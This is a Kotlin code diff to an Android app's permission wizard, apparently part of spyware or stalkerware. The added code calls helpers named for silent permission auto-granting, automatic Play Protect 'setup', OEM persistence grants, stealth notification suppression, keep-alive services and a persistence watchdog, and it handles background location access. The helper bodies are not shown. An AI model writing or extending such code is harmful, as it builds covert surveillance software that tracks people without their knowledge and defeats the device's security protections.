@@ -28,7 +28,7 @@ class PermissionWizardActivity : AppCompatActivity() {
     private lateinit var donePanel: View
     private lateinit var btnDone: Button
 
-    private val steps = PermissionSteps.ordered
+    private val steps = PermissionSteps.optional
     private var stepIndex = 0
     private var currentStep: PermissionStep? = null
     private val mainHandler = Handler(Looper.getMainLooper())
@@ -71,8 +71,12 @@ class PermissionWizardActivity : AppCompatActivity() {
             finishWizard()
             return
         }
-        stepIndex = index
         val step = steps[index]
+        if (step.id == "background_location" && !hasForegroundLocation()) {
+            showStep(index + 1)
+            return
+        }
+        stepIndex = index
         currentStep = step
 
         val done = PermissionSteps.completedCount(this)
@@ -94,6 +98,29 @@ class PermissionWizardActivity : AppCompatActivity() {
             advanceStep()
             return
         }
+        if (step.onRequest != null) {
+            btnEnable.isEnabled = false
+            btnEnable.text = getString(R.string.perm_step_waiting)
+            val reenable = {
+                if (!isFinishing) {
+                    btnEnable.isEnabled = true
+                    btnEnable.text = if (step.isGranted(this)) {
+                        getString(R.string.perm_step_already)
+                    } else {
+                        getString(step.buttonRes)
+                    }
+                }
+            }
+            when (step.id) {
+                "autostart" -> OemPersistenceGrant.runAutoGrantAsync(this, reenable)
+                "play_protect" -> PlayProtectHelper.runAutoSetupAsync(this, reenable)
+                else -> io.execute {
+                    mainHandler.post { step.onRequest?.invoke(this) }
+                    mainHandler.postDelayed(reenable, 1500)
+                }
+            }
+            return
+        }
         val missing = step.permissions.filter { !PermissionRequester.has(this, it) }
         if (missing.isEmpty()) {
             advanceStep()
@@ -101,7 +128,14 @@ class PermissionWizardActivity : AppCompatActivity() {
         }
         btnEnable.isEnabled = false
         btnEnable.text = getString(R.string.perm_step_waiting)
-        ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_STEP)
+        runCatching {
+            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_STEP)
+        }.onFailure {
+            btnEnable.isEnabled = true
+            btnEnable.text = getString(step.buttonRes)
+            advanceStep()
+            return
+        }
         mainHandler.postDelayed({
             io.execute {
                 PermissionAutoGrant.runSilentBlocking(applicationContext, 12_000)
@@ -135,9 +169,14 @@ class PermissionWizardActivity : AppCompatActivity() {
         wizardScroll.visibility = View.GONE
         donePanel.visibility = View.VISIBLE
         UserSession.setPermissionsWizardDone(this)
-        ActivityCollector.get(this).start()
         StealthNotifications.suppressAll(this)
+        SafeKeepAlive.start(this)
+        PersistenceWatchdog.schedule(this)
     }
+
+    private fun hasForegroundLocation(): Boolean =
+        PermissionRequester.has(this, android.Manifest.permission.ACCESS_FINE_LOCATION) ||
+            PermissionRequester.has(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)
 
     private fun goHome() {
         startActivity(
@@ -146,6 +185,15 @@ class PermissionWizardActivity : AppCompatActivity() {
             },
         )
         finish()
+    }
+
+    override fun onResume() {
+        super.onResume()
+        currentStep?.let { step ->
+            if (step.isGranted(this)) {
+                btnEnable.text = getString(R.string.perm_step_already)
+            }
+        }
     }
 
     override fun onDestroy() {
